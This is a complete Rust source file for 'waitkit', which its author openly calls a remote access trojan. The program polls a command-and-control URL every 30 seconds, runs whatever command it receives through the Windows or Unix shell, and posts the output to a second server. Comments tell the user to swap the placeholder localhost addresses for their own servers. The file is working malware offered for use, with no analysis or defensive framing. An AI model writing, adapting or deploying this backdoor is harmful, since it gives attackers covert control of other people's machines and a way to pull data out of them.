// waitkit v1.0.0
// a really bad RAT written in rust
// licensed under the MIT license
// by TheMemeSniper

extern crate reqwest;
use std::process::Command;
use std::thread::sleep;
use std::time::Duration;
use tokio;

#[tokio::main]
async fn main() -> Result<(), reqwest::Error> {
    let c2 = "http://127.0.0.1:8000/waitkit.txt"; // CHANGE THESE 2 VARIABLES
    let rs = "http://127.0.0.1:8000/waitkitresponse"; // c2 is your command server (which should store a
                                               // command in plaintext, not HTML) and rs is your
                                               // response server where std will be POSTed to

    let client = reqwest::Client::new();
    loop {
        let res = client.get(c2).send().await?.text().await?;// get new command from c2
        dbg!(&res);
        client.post(rs)
        .body(String::from_utf8_lossy(&exec(res)).into_owned()) // post stdout of exec to response server
        .send()
        .await?;
        sleep(Duration::from_millis(30000));
    }
}

fn exec(command: String) -> Vec<u8> { // function to execute a command and return it's output
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/C", &command])
            .output()
            .expect("failed to execute process")
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(&command)
            .output()
            .expect("failed to execute process")
    };
    dbg!("{}", &output.stdout);
    return output.stdout;
}
